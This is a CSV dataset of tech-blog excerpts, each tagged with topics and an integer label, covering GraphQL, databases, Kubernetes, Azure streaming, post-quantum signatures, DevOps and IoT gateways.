3477,"And always be ready that even if you planned and organized everything some additional changes and steps may be required, because something completely unexpected may happen in the process of work. This is the case of any sphere of business or side of the project and not only the web development, but thats also the reason why having clear expectations, plans, strategies, project briefs is so important and may help a professional web developer to offer a proactive and right solution in the case if something unexpected takes place. Global networking and communication is for sure a very challengeable thing, but it actually offers more opportunities than challenges. You should always remember that the right web developer for your project may reside in any country in the world. Many live in the USA (the average hourly rate is 80$), many in Russia (an hourly rate is only $35), some in South America. No country has a remote web development monopoly. For certain the top specialists prefer to work for the best managers and teams, as talents attract talents.","['Remote Working', 'Business', 'Web Development', 'Freelancing', 'Management']",0
3478,"For example, let us say there is a database system for all the animals in the nation of Zambia, spread across the districts of the country. Yes, this probably is the most random example but we are sticking to it. We would like to query a district and get all the animals in the district. As can be expected we have an Animal table and a Reserve table, with many animals to a single reserve relationship. If we were to query this using an API built with conventional methods, we would expect several HTTP calls procuring related data respectively. However, with Graph QL we can build a single endpoint which in turn acquires all the data with one call, and structuring the result in JSON format as shown in the image below: From this example itself, the benefits of Graph QL start to become apparent and three main benefits that can be pointed out are as follows: Graph QL solves the problem of overfetching and underfetching and instead returns the exact data that is specified. Instead of making additional calls to retrieve each `animal` entity related to the `reserve` entity, Graph QL conducts the query in a single request. Moreover, the data returned is exactly as is defined, so for example, if we only wanted the list of animals in the animal reserve and not the area size of the animal reserve, the returned result would not contain the area size and hence make querying for data overall more efficient. This can also be seen to give more control to the client, allowing it to dictate exactly what data is required and how it is required.","['GraphQL', 'AWS', 'Appsync', 'Serverless', 'API']",8
3479,"AWS describes AWS App Sync as a serverless back-end for mobile, web, and enterprise applications. Considering the pure definition, Amazon has continuously released features over the past two years to facilitate App Syncs role as a serverless service for data-driven applications. Recently, at Amazons AWS re: Invent 2018, AWS software developer engineer Karthik Saligrama described two new features which AWS was adding under the hood of the App Sync service. One of the features includes support for Aurora Serverless through automatic resolvers, and the second is pipeline resolvers which facilitate more complex Graph QL operations. These two features are now among countless other features, all easing the support of data-driven development and promoting the use of Graph QL. Apart from the two features already mentioned above, I would like to list out other basic features that I believe deserve a mention.","['GraphQL', 'AWS', 'Appsync', 'Serverless', 'API']",10
3480,"All of the major cloud providers now offer popular managed relational database services: e.g., Amazon RDS, Google Cloud SQL, Azure Database for Postgre SQL (Azure launched just this year). In Amazons own words, its Postgre SQL- and My SQL-compatible database Aurora database product has been the fastest growing service in the history of AWS. SQL interfaces on top of Hadoop and Spark continue to thrive. And just last month, Kafka launched SQL support. Your humble authors themselves are developers of a new time-series database that fully embraces SQL.","['Programming', 'Big Data', 'Software Development', 'Database', 'Data']",10
3481,"In fact, our journey developing Timescale DB closely mirrors the path the industry has taken. Early internal versions of Timescale DB featured our own SQL-like query language called io QL. Yes, we too were tempted by the dark side: building our own query language felt powerful. But while it seemed like the easy path, we soon realized that wed have to do a lot more work: e.g., deciding syntax, building various connectors, educating users, etc. We also found ourselves constantly looking up the proper syntax to queries that we could already express in SQL, for a query language we had written ourselves! One day we realized that building our own query language made no sense. That the key was to embrace SQL. And that was one of the best design decisions we have made. Immediately a whole new world opened up. Today, even though we are just a 5 month old database, our users can use us in production and get all kinds of wonderful things out of the box: visualization tools (Tableau), connectors to common ORMs, a variety of tooling and backup options, an abundance of tutorials and syntax explanations online, etc.","['Programming', 'Big Data', 'Software Development', 'Database', 'Data']",8
3482,"So, how does this translate to Docker? K8s controls CPU limits by passing the cpu-period and cpu-quota options. cpu-period is always set to 100000s (100ms), and denotes the period in which container CPU utilisation is tracked. cpu-quota is the total amount of CPU time that a container can use in each cpu-period. Both settings control the kernels Completely Fair Scheduler (CFS). Heres how different K8s CPU limits translate to Docker configuration:limits 1: cpu-quota=100000limits 4: cpu-quota=400000limits 0.5: cpu-quota=50000limits 1 means 100% of an equivalent 1 CPU can be used every 100ms, limits 4 means 400% of an equivalent 1 CPU (i.e. equivalent 4 CPUs) can be used every 100ms and so on. Dont forget, this is spread across all CPUs. Because of the way CFS quotas work, any container exceeding its quota in a given period will not be allowed to run again until the next periodthis means you may notice inexplicable pausing, particularly if your component is CPU bound and latency sensitive.","['Kubernetes', 'Cpu']",11
3483,"Since serverless is becoming more and more commonand desired I decided to setup a Kappa Architecture using Azure Functions as Stream Processing Engine and Cosmos DB as data Serving Layer. Event Hubs provides the Immutable Log support.100% Serverless Data Streaming Architecture. Lets figure out: setting up everything is quite easy, but there is something tricky in the process, that could make it a little less simple than one would expect. This article is here to help.","['Big Data', 'Cosmosdb', 'Serverless', 'Lambda', 'Streaming']",11
3484,"To get started with the solution I decided to create two Locust instances each one simulating 500 users, for a total load of a bit more than 1000 messages/second, or near 70K messages/minute as visible in the metrics: Its not a huge load, but its great to start without burning all you credit card budget. Once I was confident with the whole solution, I tested everything up to 10K messages/second. Which is almost a billion messages per day. Enough for my tests and for many use cases. And you can always scale up even more if you need to. In the sample code you can find at the end of the article you have settings to test 1K, 5K and 10K messages/seconds. Just dont blame me about your bill, ok? Event Hubs is one of the possible choices here (others are Io T Hub and Event Grid) and it doesnt really require a lot of configuration. The main options here are the number of partitions and the throughput units.","['Big Data', 'Cosmosdb', 'Serverless', 'Lambda', 'Streaming']",6
3485,"Now, let me repeat this, the number of partition then really depend how complex, and thus how fast, your data processing logic can be. If you dont have a clear idea of which would be the correct number to use, then you can start with this rule of thumb: create an amount of partitions equal to the number of throughput units you have or you might expect to have in future (since you cannot change the partition number once the Event Hub has been created), and then test and monitor the throughput metric of Event Hubs. If the number of processed messages keep up with the incoming messages youre good. If not, try optimize and/or scale-up (yep, scale-up. You can always scale out later) your consumer application. If youre using Azure Functions or Spark or a containerized application its easy. If this doesnt solve the problem, then you may want to evaluate the scale out option, that is usually more expensive.","['Big Data', 'Cosmosdb', 'Serverless', 'Lambda', 'Streaming']",3
3486,"On the contrary of what happens with partitions, throughput units can easily be scaled up or down. I decided to go with two in order to have some space to move in case I needed to recover messages not processed. Heres an example: The light blue line represent the throughput of messages being ingested (per minute) while the dark violet color shows the messages consumed. As you can see, Ive highlighted a case where I needed to restart the stream processing engine and thus messages were accumulated in the Event Hub. As soon as the processing engine was restarted it tried to catch up with the messages accumulated and thus it used more bandwidth then it would normally have done. If you dont want to pre-allocate too many throughput units you can use the Auto-Inflate option that Event Hubs provides. But I would recommend to allocate a little bit more that the exact number of throughput unit you need so the solution can quickly answer to higher load request. The Auto-Inflate is great but it needs some time to kick-in and if youre interested in keeping the latency low having a few spare throughput units to use immediately helps a lot.","['Big Data', 'Cosmosdb', 'Serverless', 'Lambda', 'Streaming']",3
3487,"Another option you may want to evaluate is the Capture option. It allows to safely store the ingested data into a blob store so that it can be processed later using some batch processing techniques. Also perfect for just doing some data analysis on the fly thanks to the fact that it saves data into a Apache Avro format and thus you can easily use Apache Drill to query it: Of course also Apache Spark is another option, especially, if you need a more versatile distributed computing platform for your newly create Data Lake. In such case I would recommend Azure Databricks, that can connect to Azure Blob Storage right away: Usually Apache Storm or Apache Spark or Azure Stream Analytics are the to-go options for Stream Processing. But if you dont need time-aware features, like Hopping or Tumbling Window, complex data processing capabilities, like stream joining, aggregates of streams and the likes, a more lightweight solution can be an option.","['Big Data', 'Cosmosdb', 'Serverless', 'Lambda', 'Streaming']",11
3488,"After having defined the indexes I needed, I did run some tests to measure how many RU a single document insert would have used. I measured a bit more then 6. If I want to be able to insert 1000 documents/second and I need 1000*7=7000 RU. Since I also want to query the data at some point (each document written needs also to be read at once in my scenario), that I can safely assume I may need 14000 RU. Add some space for other queries, and the correct starting RU value for me is 20000 RU. If Im wrong I can always change it later in almost real time. Thats the real beauty of Cosmos DB to me.","['Big Data', 'Cosmosdb', 'Serverless', 'Lambda', 'Streaming']",8
3489,"But of course, C being an unsafe language, you can also do things like this: We compile this code: Lets pretend we didnt see the compiler warning (or maybe it just got lost in pages of other build output, or it was even turned off), and run the code (without Graal VM for now): Whoops. The problem is the mistyped format specifier %n instead of %d. The %n format specifier stores the string length until that point into the provided pointer. An int is not a valid pointer, but printf tries to write to it anyway. Since C is an unsafe language, the compiler will happily generate code that will pass an int where a pointer should go. At runtime, values are not typed, and a pointer is just another number, so the code inside printf has no way to detect the problem.","['Llvm', 'Graalvm', 'Security', 'Virtual Machine', 'Compilers']",3
3490,"We define ourselves as passionate group of people who love what we do and think beyond, but were not just winging it. Our roadmap has 3 phases with corresponding actions and outcomes: Phase 1: We know well build this Unit tests without the database (which is hard with Ruby on Rails)Multiple daily releases Increased test coverage Kill flakey tests Autoscaling and stable CI infrastructure Target build time to sub-5 minutes (challenging on a 800K line codebase)Phase 2: We think well build this Make QA environment unnecessary Roll forward (instead of backwards)Remove all manual steps Canary deployments Multi-day releases Easily add new applications and gems to CITarget build time to sub-3 minutes Phase 3: We might build this Test in Production (experimental improvements)Performance tests in the pipeline Shadow traffic deployment Low code workflow Anyone can deploy to Production at anytime Of course, with all of this change comes a varying impact. Its particularly confronting for people who have been with Flux for many years and who are used to working a certain way. When you start to introduce changes, you kind of flip their world upside down because theres a loss of autonomy through the standardisation of process. But to do the right thing for Flux, a lot of standardisation needs to happen like unified builds and narrowing down processes. With standardisation, we remove organisational waste. Ultimately, were trying to optimise for the organisation.","['Continuous Integration', 'Continuous Improvement', 'DevOps', 'Software Development', 'Automation']",1
3491,"Investigating the world wide web, you see Code Coverage is the key index out there, and depending on your code type (functionality, logic, etc. ), you can define a random code coverage percentage you want to enforce. Trying to achieve this, you can see that, in most cases, 100% is almost impossible. While 80% is better for your code, is 100 really better than 80? If you add more tests, does this mean your tests suite is stronger? Or is it just causing an exaggerated overhead on adding functionality? There are some pitfalls in pursuing a random coverage index. From my personal experience, as a hard-working developer, I sometimes feel I am investing too much time in creating and modifying tests during all development and maintenance phases. On the other hand, I once heard from a sneaky and lazy developer friend that he heard some developers are adding tests to improve coverage, but that these tests are not fully covering the functionality OMG!!! Improving coverage is easyjust call the function, or load the object, use different inputsdone! And it doesnt always happen on purpose. Sometimes we simply didnt think about all edge cases of the unit being tested, perhaps since we were so focused on killing the red lines of uncovered code.","['Software Development', 'Unit Testing', 'Code', 'Code Coverage', 'Automation']",13
3492,"With this Alice creates a key-pair: a public key and a private key. She then takes a hash of the message, and encrypts this hash with her private key (this is her signature), and passes the message and the signature to Bob. Bob then reads the message and takes a hash of it. He then decrypts Alices signature with her public and checks the hashes. If they match, he knows that she signed it, and that it has not been changed along the way: Currently, we often use RSA, DSA and ECDSA to sign our messages. These are based on the difficulty of finding out the factors of a number and on the processing of discrete logarithms. At the current time these methods are computationally hard problems, but with quantum computers, they become much easier. This was shown by Peter Shor who illustrated that it was possible to crack them in polynomial time.","['Quantum Computing', 'Quantum Robust', 'Elliptic Curve', 'Cryptography', 'Programming']",3
3493,"Sometime soon we perhaps need to wean ourselves of our existing public key methods, and look to techniques that are more challenging for quantum computers. With the implementation of Shors alorigthm [here] on quantum computers, we will see our RSA and Elliptic Curve methods being replaced by methods which are quantum robust. One method is the Lamport signature method and which was created by Leslie B. Lamport in 1979. At the current time it is thought to be a quantum robust technique for signing messages. When we sign a message we take its hash and then encrypt with our private key. The public key is then used to prove it, and will prove that we signed it with our private key. The Lamport signature uses 512 random hashes for the private key, and which are split into Set A and Set B. The public key is the hash of each of these values. The size of the private key is 16KB (2256256 bits) and the public key size is also 16 KB (512 hashes with each of 256 bits).","['Quantum Computing', 'Quantum Robust', 'Elliptic Curve', 'Cryptography', 'Programming']",5
3494,"W-OTS uses relatively small key and signatures sizes, and is thought to be quantum robust. It generates 32256 bit random private keys. We then have these a number of times, and is defined by a parameter (w). If we use w=8, we hash the private keys by (2w). This creates 32256 bits public keys. The signature is the created by taking eight bits at a time, and then the 8-bit binary int (n) is subtracted from 256 and the private key is the hashed 256-n times. The signature is then 32 hashes which are derived from random private keys. To verify the signature, the recipient parses the hash of the signature (using 8 bits at a time, and extracting the 8 bit int, n). The signature is then derived from the signature.","['Quantum Computing', 'Quantum Robust', 'Elliptic Curve', 'Cryptography', 'Programming']",3
3495,"The roots of hash-based methods is Merkle trees, and which are a way of hashing used in many applications, including with Bitcoin, Ethereum, Git distribution systems, No SQL, and P2P file transfer. With a Merkle tree we take our data elements, and then hash them, and take pairs of these hashes to create a new hash, and so we build a hierarchical tree. At the top of the tree is the root element (in this case Hash1234): In this way, we can use the tree to see if we have matching data on systems. On a P2P network, we can transfer a file by splitting it into data segments and then distributing these segments across the network. A trusted source will have the complete Merkle tree for rebuilding the file, and a client can thus rebuild from the Merkle tree and determine the parts of the file which are still missing (or are in error). Once transferred, the root hash (and all the other hashes) will then match. In its core method, the Merkle Signature Scheme (MSS) has serious performance and memory issues, but enhanced methods such as XMSS create the hash table with much less of a performance hit.","['Quantum Computing', 'Quantum Robust', 'Elliptic Curve', 'Cryptography', 'Programming']",11
3496,"The methods present for W-OTS and Lamport only provide for a one-time signature. In order to sign many messages, we can use the Merkel signature scheme (MSS). With we take a hash of the keys and build these as the leaves of the tree. The root of the tree is then the public keythe verification key. We then just use the private key of the OTS method to create the signature. The sender also sends the authentication path, which is the neighbouring nodes within the path which leads to the root of the tree. At the receiver end, they can then rebuild the tree using the verification key (which can be received a digital certificate) and the authentication path. For we move onto another key pair and where the index of the key part is revealed.","['Quantum Computing', 'Quantum Robust', 'Elliptic Curve', 'Cryptography', 'Programming']",7
3497,"Loading messages or animations are EVERYTHING. If users cant see that something is happening, then they dont know and they assume there isnt. That means repetitive clicks and changes that your code might not know how to handle. Just give them a damn spinner! 80% of the questions I got from users were about the same kinds of things. Redirecting them to a FAQ page meant my inbox was a lot less full.","['UX', 'Software Development', 'Engineering', 'Programming', 'Project Management']",19
3498,"Regarding cost, you should consider the following: It is always going to be better for your app to never include the widget in the first place. This way Flutter doesnt have to worry about widgets that arent ever going to be displayed. If its something that you may include based on some state then you can still use this approach as well but it may help to simplify things by using a more generic mechanism. In general, your approach will be a bit like: When deciding what strategy to use, ask yourself the following: Will the condition for displaying my widget never be met for certain cases? An example is when you have a first time experience, on-boarding, etc. If you have a condition where you only show it the first time the app starts then you wont want to include it ever again. In this case you should not include your widget in the first place. You can use a Gone strategy.","['Flutter', 'Mobile', 'Mobile Design', 'Architecture']",19
3499,"To find out, should I check the embedded README on Docker Hub? Should I try to track down the actual Dockerfile out there somewhere? Should I check the official docs of the company, platform, product, tool, etc.? And then what about me and my own development practices? How should I offer instructions to others? One possibility is to use labels or annotations to point people to the right information. Brandon Mitchell, for example, suggested this path in his response to my tweet: This helpfully alerted me to the existence of the Annotations spec, which is part of the Open Container Initiatives Image Format Specification. One of the pre-defined annotation keys in the spec is an org.opencontainers.image.documentation key thats intended to point to canonical documentation URL for the image.","['Docker', 'Documentation', 'Containers']",7
3500,"In earlier days, solutions were associated with getting the technology right. The key was technology, the solution was technology and the business expected and paid for technology. Well, at least for those of us taking notice. Today technology is hardly ever a significant problem. Technically, we have a less complicated world. Over the years we have come to understand that technology is basically an arrangement of Processing, Memory, Networking and Storage. We have mastered utilization by using virtualization. We understand horizontal scaling is better than vertical scaling and that we can deliver the PMNS more easily in converged and hyperconverged products that also contain the software solution. We have automated many of the key activities to enable reduction in time and costs.","['DevOps', 'Devops Training', 'Devopstraininginbangalore', 'Mastering Devops']",16
3501,"The Cloud paradigm came along and made life easier by helping us to become Service Brokers rather than server admins or network engineers. To the customer we are now Service Brokers; well, we should be. We should be experiencing shorter procurement cycles given that applications and services (the solutions) are delivered from a Service Catalog. Although this can be true in the Public Cloud deployment model and the Software as a Service (Saa S) delivery model, when it comes to Private Cloud procurement we still seem to be stuck in the past and suffer unnecessary delays. Even as Public Cloud services are taken up by more and more businesses the activity of getting the servers, applications and services up there still makes for hard going. All the work that is required to design and deliver a Public Cloud hosted environment is still steeped in old-fashioned working practices.","['DevOps', 'Devops Training', 'Devopstraininginbangalore', 'Mastering Devops']",10
3502,"In most cases an application is developed for one of two reasons. To provide a solution for an external customer or to provide an application for the business with which it can make money. For instance, a company needs to pay salaries. To do that it needs an application that can pay the salaries, calculate tax and pension information and enter data into a database and then print a payslip all in accordance with the legal framework set out in the Revenue Services rules of engagement. An application development company will take on that challenge and through a series of iterations it will deliver an application that meets all of the customer and legislative requirements. For a business that wants to make money from an application the scenario is very similar to that for an external customer. The difference is financial in that the business has to justify the cost of having developers on staff creating the application. That cost is set against a forecast of income from the eventual deployment of the application as a service for the business.","['DevOps', 'Devops Training', 'Devopstraininginbangalore', 'Mastering Devops']",12
3503,"Solution design and application development saw the arrival of Lean and Agile as a really effective way to operate and yet, silos remained. Companies operated Agile but, kept the silo way of doing things. Strange when you think about it. Agile means flexible and able to change without trauma. Silo is a pit with high sides that makes change very difficult. So, in essence, Agile and silo worked together and made change difficult.","['DevOps', 'Devops Training', 'Devopstraininginbangalore', 'Mastering Devops']",12
3504,"The Application Developer creates an application from a concept or from a request. A Technical Services (TS) Architect is asked to create a High Level Design (HLD) for the application infrastructure. The TS Architect passes the HLD to the Project Architect to review the design. The Project Architect passes the final HLD back to the TS Architect. The TS Architect explains the design to the application developer and covers off any items that are likely to compromise the application. This is usually done in isolation from other experts. The HLD is signed off buy someone or other and the Project Architect sets about carrying out a due-diligence activity prior to creating the Low Level Design (LLD or Build Doc) for the application infrastructure. The Project Architect has to visit various Subject Matter Experts (SMEs) for Compute, Network, Storage and Disaster Recovery (DR) to find out what technologies and requirements will need to be in the LLD. Details around protocols, routing, security and firewall rules can be complex and can negatively affect the application if not carefully planned. To get this right a Business Impact Analysis expert needs to be consulted to make sure that security and compliance problems, if they exist, can be dealt with or mitigated. Most applications are deployed to virtual infrastructures which require the involvement of virtualization experts to aid provisioning and automation technologies. All in all, the Project Architect has to consult with many different silos of technology/experts. In the course of this activity the Architect has to constantly return to the application developer to check that what is being planned for the infrastructure is not going to damage the application design and make the application ineffective when deployed. Finally, the Service Wrap needs to be put in place to support the application and to meet the non-functional requirements in the Service Level Agreements (SLAs). There could easily be twenty people involved in this process. I havent included test and development as this usually waits until the end of the main process along with User Acceptance Testing (UAT). Sometimes there is a separate team that handles this part, sometimes its carried out by Operations. Application design also includes the dependency tiers that provide the middleware and database layers. It could be that many more people will need to be involved when those services are included. What is true is that each SME is part of a silo. The project has to consult all these silos. Some are helpful, some are not and there are lots of reasons why No! can be the answer to all questions and suggested solutions.","['DevOps', 'Devops Training', 'Devopstraininginbangalore', 'Mastering Devops']",0
3505,"Most SMEs like to keep their information to themselves. Not true of all but, of many. Its part of the traditional culture that has developed over many years. Working practices have made change difficult. Management of change is one of the most challenging tasks any company can embark on. Resistance will be resilient as it is important that people give up something to gain something. Making it clear what the gains are is imperative. People will change their attitudes and behaviours but, you have to give them really good reasons to do so. Ive found that running multi-discipline workshops for the SMEs has proven an effective method of encouraging information-sharing and the breaking down of those pit-walls.","['DevOps', 'Devops Training', 'Devopstraininginbangalore', 'Mastering Devops']",0
3506,"I dont think that this is all Dev Ops is. The inference is that Dev Ops is concerned only with application development and operations. I believe that Dev Ops is a paradigm and that like other IT standards and paradigms it is relevant to all IT and not just applications. By removing the partitions between each practice in the chain and having all the key players involved from day one, as part of an inclusive and collaborative team, the cycle of application development and solution design becomes a continuous process that doesnt have to divert to consult each required expert. No-one needs to throw a document over the wall to the next crew. Each document is written within the collaboration process and this has to make the document more relevant and powerful. Imagine that the project team is always in the same room from concept to deployment and each expert is always available to comment on and add to each step of that project. How much better than the traditional method where it can take days to get an answer to a simple question, or to even find the right person to ask.","['DevOps', 'Devops Training', 'Devopstraininginbangalore', 'Mastering Devops']",12
3507,"Dont allow your company to implement Dev Ops in isolation and only as a framework for application development. To do that would be to create another silo. Use it for every project and as the default culture for all your teams whether or not they are developers, engineers, architects or operations. Dev Ops doesnt need deep and profound definitions or long and tedious conversations about what it is and how to implement it.","['DevOps', 'Devops Training', 'Devopstraininginbangalore', 'Mastering Devops']",12
3508,"Our goal was to design a solution that would scale to 5x growth, with reasonable cost efficiencies and improved as well as more predictable latencies. Informed by the analysis and understanding of the problems discussed above, we undertook this significant redesign. Here are our design guidelines: Data Category Shard by data type Reduce data fields to just the essential elements Data Age Shard by age of data. For recent data, expire after a set TTLFor historical data, summarize and rotate into an archive cluster Performance Parallelize reads to provide an unified abstraction across recent and historical data Previously, we had all the data combined together into one cluster, with a client library that filtered the data based on type/age/level of detail. We inverted that approach and now have clusters sharded by type/age/level of detail. This decouples each data sets different growth rates from one another, simplifies the client, and improves the read latencies.","['Big Data', 'Timeseries', 'Distributed Systems', 'Database', 'Netflix']",8
3509,"Like in the previous architecture, LIVE and COMPRESSED records are stored in different tables and are tuned differently to achieve better performance. Since LIVE tables have frequent updates and small number of viewing records, compactions are run frequently and gc_grace_seconds is small to reduce number of SSTables and data size. Read repair and full column family repair are run frequently to improve data consistency. Since updates to COMPRESSED tables are rare, manual and infrequent full compactions are sufficient to reduce number of SSTables. Data is checked for consistency during the rare updates. This obviates the need for read repair as well as full column family repair.","['Big Data', 'Timeseries', 'Distributed Systems', 'Database', 'Netflix']",8
3510,"First, the software running on the server must be updated regularly at least when it comes to applying security patches. Of course this often simply is not done. Next, servers can fail which means that the website is not available at least temporarily. If the website is used for selling products or services the corresponding stream of revenue runs dry. Furthermore, your website might get some serious attention which might result in a high amount of traffic. Running only on one server might mean that the site gets slow and the experience for your users degrades. Again, this might have a negative impact on money earned with the website. Last but not least, you are paying for running the server even if no users are visiting your site.","['AWS', 'S3', 'Cloudfront', 'Static Websites']",17
3511,"Calculating the actual costs for your site is difficult. It depends on the usage characteristics of your site. For example, you pay for each request send to Cloud Front. This means that the costs for serving lots of small files is more expensive than serving fewer but bigger ones. I think its safe to say that hosting a website on AWS costs approximately $1 per month. This would already include some basic traffic (~ 4 GB / month). Additionally, the major benefit is that you do not need to manage any servers or think about the availability and scalability of your site. This is all done automatically for you.","['AWS', 'S3', 'Cloudfront', 'Static Websites']",17
3512,"When you call docker run it will begin its internal execution. First, it will call the create endpoint and a container is then created and allocated with a unique ID and this container remains stopped. Then, it will call the attach endpoint. It means that it will connect to the stdin/stdout/stderr of the container, allowing the container to read data and generate an output based on the received data. After the attachment iscomplete, it will call thestartendpoint, which starts the container. After the container execution, the response will be shown and the container will remain stopped, unless the option --rm waspassedin this case the container will be destroyed right after the end of its execution.","['Docker', 'Nodejs', 'JavaScript', 'API', 'Containers']",7
3513,"We will use the following command as base for our implementation: Command: echo ""hello world"" | docker run -i alpine tr [a-z] [A-Z]Result: HELLO WORLDDocker containers enable lots of cool possibilities like the example of this article which is really simple, but we could create an application that would act upon receiving data and perform complex operations with it like code compilation and runtime execution. We could spawn containers on demand to deal with some tasks, and if we think about it, it is what serverless actually is. On serverless world, containers can be scaled on-demand. However, the process of spawning containers should be managed by container orchestrators like kubernetes or docker swarm. There are lots if interesting open-source projects like these, and each one has some particularities. The project I enjoyed most was Open Faas, as it integrates with the orchestrator quite easily. I am also keeping an eye on Knative, as it is on its way to be a good foundation for future serverless projects.","['Docker', 'Nodejs', 'JavaScript', 'API', 'Containers']",7
3514,"This is one of my pet peeves. Im not a huge fan of chat bots on the web. But, they seem to be really popular: What do these do? As you might imagine, this chatbot pings the server regularly to let the server know if the there is an agent available, and if a chat has started. There is a second ping that gives the time between pings (and sets a delay for the next ping): As far as I can tell, this ping delay is not implementedthe pings do not actually slow down. The number of pings is also not any different if there is no agent available.","['Web Development', 'Performance', 'Mobile']",11
3515,"Sometimes people get glamoured by the pictures they see on Instagram of a dude attempting to be code at the beach on a sunny day. Ive been a programmer for more than ten years, and I have not been able to code at the beach efficiently. I have attempted it a couple times, but it did not work out for me. At least in my experience that has been the case. What Im trying to say is that sometimes people want to become programmers for the wrong reasons. Aspiring developers like the freedom being portrayed in social media, but sometimes that is all it is, just a portrayal. There is a lot of freedom that comes along with being able to work from any place with a Wi Fi connection, but there still some limitations. There are a lot of good things that come from being a programmer, the biggest, in my opinion, is knowing that someone out there is using an application you built in their everyday life. I became a programmer because I love to create cool shit and then eventually the perks of being a programmer came along.","['React', 'Software Development']",2
3516,"Let me start with bad news first. If you arent able to sit in front of the computer for long periods of time and work late nights, sorry to say this might not be for you. I say this because you will have to work long hours to develop an application worthwhile, once that application goes live you might be required to work even longer hours. If the app goes down for whatever reason, you will be expected to show up in the office (or get online at 3AM) to help resolve the issue. At the very least you will have to respond as soon as possible, even if you are working on another project. If you dont like the sound of this, maybe being a developer might not be for you.","['React', 'Software Development']",0
3517,"Now that we got all the negativity out of the way lets get into something more constructive. Dont try to take on too much too fast. I suggest you get proficient at one thing at a time before moving onto learning something else. Figuring out where you want to end up working will help with this. If youre going to be a full-stack web developer, focus on either the front-end or the back-end until you learn it, then and only then move on to the other. Trying to learn both at the same time might overwhelm you. Lets explore or this scenario a bit more. Lets assume you will choose to learn the front-end first, then move on to the back-end and you know your way around a computer, but have not taken any computer science courses.","['React', 'Software Development']",19
3518,"Front-End Web Development HTML, CSS and Javascript. Those are the main things you will need to learn to be able to build a UI. Java Script can be used on the back-end, but in this case, Java Script will be used for the UI. HTML and CSS, go hand in hand, and without being familiar with those two, you wont get far, so I advise you learn these first. Then you can get familiar with Java Script, pure JS without j Query or any other framework or library. I would only devote enough time to learn how to access DOM elements (by the way if you dont know what some of the acronyms or terms mean, I will make a list at the bottom of the most common ones) and make simple manipulations to HTML elements. Once you feel comfortable moving around the DOM, I recommend choosing a Java Script framework. I like React JS (technically, React is a library, but many refer to it as a framework), there is also Angular and Vue JS which are very popular. All have their pros and cons, the reason why I chose React is that is the most versatile, and once you know React JS, the learning curve to learn React Native is small, this will be an advantage if you ever want start building mobile applications. Take some time to do some research and pick the one you think is the best.","['React', 'Software Development']",19
3519,"Mobile Development Like web development there a few flavors you can choose from. You can be a truly native developer and learn Java or Kotlin to develop for Android then learn Swift to code for i OS devices. Or, you can choose React Native for which you need to learn Java Script and develop for both platforms, Android, and i OS at the same time. I personally chose this route because using React Native is just a hop away if you are already familiar with React JS. React or React Native will require you to have knowledge of Java Script. Another advantage is that if you start with mobile development using React Native moving your skills to web development the learning curve will be minimal.","['React', 'Software Development']",19
3520,"Notes:this runner is running in a container on the swarm. We could have use a shared runner, runners publicly available which share their time between the jobs needed by different projects hosted on Git Lab. But, as the runner needs to have access to the Portainer endpoint (to send the webhook), and because I did not want Portainer to be accessible from the outside, having the runner inside the cluster is more secure.also, because the runner runs in a container, it sends the webhook to the IP address of the Docker0 bridge network in order to contact Portainer through the port 9000 it exposes on the host. The webhook thus as the following format http://172.17.0.1:9000/api[]a7-4af2-a95b-b748d92f1b3b The update of a new version of the site follows the workflow below: A developer pushes some changes to Git Lab. The changes basically involve one or several new events in the __url__ file plus some additional sponsors logos.2. The Git Lab runner performs the actions defined in.gitlab-ci.yml.3. The Git Lab runner calls the webhook defined in Portainer4. Upon the webhook reception, Portainer deploys the new version of the www service. It does so calling the Docker Swarm API. Portainer has access to the API as the socket /var/run/ __url__ is bind mounted when it is started If you want to know more regarding the usage of this unix socket, you might be interested by this previous article5. The users can then see the new version of the web site Lets change a couple of things in the code and commit / push those changes.","['Docker', 'Gitlab', 'Portainer', 'Docker Swarm']",11
3521,,"['Open Source', 'Incident Response']",16
3522,"On the surface, this sounds like functional orientation of teams; something the Dev Ops movement has tried hard to eliminate. However, many mature, high-performing engineering organizations utilize this approach and find it consistent with Dev Ops practices. Dedicated platform engineering teams are not a throwback to legacy IT models of operation. Even pure functionally oriented teams can be compatible with a Dev Ops model: Organizational size and industry vertical play a role in how the six axioms impact team structure. Products or services in the proof of concept phase of life, of lower complexity, or inconsequential security concerns obviously dont need dedicated platform engineering teams. So when are dedicated teams needed?","['DevOps', 'Security', 'Cloud', 'Sre', 'Software Development']",12
3523,"Getting security right also increases in difficulty. Your organization now has problems in authentication and authorization of service-to-service communication. Engineering teams that were designing for confidentiality and integrity requirements using pre-shared keys and network access control lists find these solutions no longer scale. The operational overhead for symmetric key management and maintaining lists of IP addresses sink the historical ways of doing security. (For the inherent headaches of managing IP addresses in a ephemeral, cloud native world and the emergent patterns for network design see: Trust No One: A Gap Analysis of Moving IP-Based Network Perimeters to A Zero Trust Network Architecture)Platform teams should now be creating abstractions that functional teams can consume which provide for service identity built on a public key infrastructure and internal certificate authorities. These abstractions will provide for mutually authenticated communication over untrusted networks, such as the public Internet.","['DevOps', 'Security', 'Cloud', 'Sre', 'Software Development']",10
3524,"Consistency in meta-tagging of resources is probably the most obvious, least-impactful to development teams, yet one of the hardest areas to get right. At my last gig, we had an extended debate about what to build first when kicking off our platform team. Visibility is the most primitive of primitives was a quote that emerged from that discussion. If you dont know what you have how can you even begin to manage (govern) it? It is not surprising that the first two controls in the CIS Top 20 list are inventory of hardware and inventory of software assets. (For more on this see my article on asset management.) Therefore, building visibility in into the entire business value pipeline should be one of the highest priorities for a platform engineering team.","['DevOps', 'Security', 'Cloud', 'Sre', 'Software Development']",12
3525,"Lets look at a couple of examples of how this would work. First, lets start with something simple, a Wi Fi-based sensor network. Fair warning though, Im not advocating for using Wi Fi for your Io T deployment unless you understand exactly what that means for the kind of environment youre deploying your sensors in. Back to Wi Fi sensors; lets say you built your sensor platform using Raspberry Pis (its not an unheard of practice, shall we say). Your gateway in this scenario is your Wi Fi Access Point. In your home, this Access Point would be your Wi Fi router. This allows the sensor to transmit its readings to your server using Wi Fi connection offered by your Gateway (Access Point).","['Internet of Things', 'IoT', 'Edge Computing', 'Sensors']",11
3526,"Lastly, lets look at a really complicated example. You have a host of sensors monitoring a fuel pipeline spread over several hundred miles. There might be over a hundred miles between a sensor in this scenario. Also, running cable is prohibitive and youre in the middle of the wilderness. In this scenario, one answer is to deploy a gateway that the sensors can talk to but to have the gateways be able to talk to each other. This allows one gateway to transmit its information to another gateway, using it as a relay to get to the corporate network that way. These gateways would have different radios with one being optimized to talk to the sensors and the other to transmit over long distances.","['Internet of Things', 'IoT', 'Edge Computing', 'Sensors']",11
